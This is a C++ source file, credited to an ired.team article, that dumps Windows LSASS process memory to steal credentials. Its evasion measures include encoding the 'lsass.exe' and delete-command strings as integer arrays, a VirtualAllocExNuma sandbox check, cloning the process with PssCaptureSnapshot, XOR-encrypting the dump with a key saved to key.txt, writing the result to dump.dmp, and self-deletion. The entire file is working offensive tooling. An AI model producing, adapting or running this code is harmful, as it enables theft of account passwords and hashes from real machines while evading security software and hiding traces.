// credit: ired.team - Dumping Lsass without Mimikatz with MiniDumpWriteDump 
// https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass

#define NOMINMAX
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <string>
#include <random>
#include <vector>
#include <cctype>
#include <limits>
#include <ctime>
#include <cstdlib>
#include <TlHelp32.h>
#include <processsnapshot.h>
#pragma comment (lib, "Dbghelp.lib")

using namespace std;

// Buffer for saving the minidump
LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 100);
DWORD bytesRead = 0;

BOOL CALLBACK minidumpCallback(
	__in     PVOID callbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput->CallbackType)
	{
	case 16:
		callbackOutput->Status = S_FALSE;
		break;

	case IoStartCallback:
		callbackOutput->Status = S_FALSE;
		break;

	case IoWriteAllCallback:
		callbackOutput->Status = S_OK;

		source = callbackInput->Io.Buffer;
		destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);

		bufferSize = callbackInput->Io.BufferBytes;
		bytesRead += bufferSize;

		RtlCopyMemory(destination, source, bufferSize);

		break;

	case IoFinishCallback:
		callbackOutput->Status = S_OK;
		break;

	default:
		return true;
	}
	return TRUE;
}

wstring ASCIItoWString(const vector<int>& asciiValues) {
	wstring wstr;
	for (auto val : asciiValues)
		wstr.push_back(static_cast<wchar_t>(val));
	return wstr;
}

string ASCIItoString(const vector<int>& asciiValues) {
	string str;
	for (int val : asciiValues)
		str += static_cast<char>(val);
	return str;
}

void XOR_EncryptDecrypt(LPVOID data, size_t dataSize, const char* key, size_t keySize) {
	char* dataBytes = reinterpret_cast<char*>(data);
	for (size_t i = 0; i < dataSize; ++i) {
		dataBytes[i] ^= key[i % keySize];
	}
}

// true polymorphism
constexpr unsigned int numRNG() {
	const char* timeStr = __TIME__;
	unsigned int hash = 0;

	for (int i = 0; timeStr[i] != '\0'; ++i)
		hash = 31 * hash + timeStr[i];
	return 50 + (hash % 10);
}

string stringRNG(int length) {
	random_device rd;
	mt19937 generator(rd());
	uniform_int_distribution<int> distribution(numeric_limits<char>::min(), numeric_limits<char>::max());

	string str;
	str.reserve(length);

	char randomChar;
	for (int i = 0; i < length; ++i) {
		do {
			randomChar = static_cast<char>(distribution(generator));
		} while (!isalnum(randomChar));
		str += randomChar;
	}
	return str;
}

void SelfDelete() {
	char buffer[MAX_PATH];
	GetModuleFileNameA(NULL, buffer, MAX_PATH);
	string executableName(buffer);

	vector<int> cmdPart1 = { 99, 109, 100, 32, 47, 67, 32, 100, 101, 108, 32 }; // "cmd /C del "
	vector<int> cmdPart2 = { 32, 38, 32, 101, 120, 105, 116 }; // " & exit"
	string cmd = ASCIItoString(cmdPart1) + "\"" + executableName + "\"" + ASCIItoString(cmdPart2);

	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	CreateProcessA(NULL, &cmd[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

int main() {
	SECURITY_ATTRIBUTES secAttr;
	secAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	secAttr.lpSecurityDescriptor = NULL;
	secAttr.bInheritHandle = FALSE;

	HANDLE processHandle = GetCurrentProcess();
	SIZE_T size = 1024;
	DWORD allocationType = MEM_COMMIT | MEM_RESERVE;
	DWORD protect = PAGE_READWRITE;
	DWORD preferredNode = 0;

	LPVOID allocatedMemory = VirtualAllocExNuma(
		processHandle,
		NULL,
		size,
		allocationType,
		protect,
		preferredNode
	);

	if (allocatedMemory == NULL)
		return 1;

	BOOL freeResult = VirtualFreeEx(
		processHandle,
		allocatedMemory,
		0,
		MEM_RELEASE
	);

	if (freeResult == 0)
		return 1;

	DWORD lsassPID = 0;
	DWORD bytesWritten = 0;
	HANDLE lsassHandle = NULL;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	LPCWSTR processName = L"";
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	// Get lsass PID
	vector<int> exeVect = { 108, 115, 97, 115, 115, 46, 101, 120, 101 };
	wstring readableString = ASCIItoWString(exeVect);
	const wchar_t* exeName = readableString.c_str();
	if (Process32First(snapshot, &processEntry)) {
		while (_wcsicmp(processName, exeName) != 0) {
			Process32Next(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			lsassPID = processEntry.th32ProcessID;
		}
	}

	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);

	// Set up minidump callback
	MINIDUMP_CALLBACK_INFORMATION callbackInfo;
	ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
	callbackInfo.CallbackRoutine = &minidumpCallback;
	callbackInfo.CallbackParam = NULL;

	// Dump lsass
	HANDLE snapshotHandle = NULL;
	DWORD flags = (DWORD)PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;
	MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
	ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
	CallbackInfo.CallbackRoutine = &minidumpCallback;
	CallbackInfo.CallbackParam = NULL;
	
	PssCaptureSnapshot(lsassHandle, (PSS_CAPTURE_FLAGS)flags, CONTEXT_ALL, (HPSS*)&snapshotHandle);
	BOOL isDumped = MiniDumpWriteDump(snapshotHandle, lsassPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
	if (isDumped) {
		// XOR Keygen
		constexpr unsigned int randLength = numRNG();
		string randStr = stringRNG(randLength);
		const char* xorKey = randStr.c_str();

		HANDLE xorFile = CreateFile(L"key.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		DWORD keyBytesWritten;
		WriteFile(xorFile, xorKey, strlen(xorKey), &keyBytesWritten, NULL);
		CloseHandle(xorFile);

		// XOR Encryption
		size_t xorKeySize = strlen(xorKey);
		XOR_EncryptDecrypt(dumpBuffer, bytesRead, xorKey, xorKeySize);

		HANDLE dumpFile = CreateFile(L"dump.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		WriteFile(dumpFile, dumpBuffer, bytesRead, &bytesWritten, NULL);
		CloseHandle(dumpFile);
	}

	PssFreeSnapshot(GetCurrentProcess(), (HPSS)snapshotHandle);
	SelfDelete();
	return 0;
}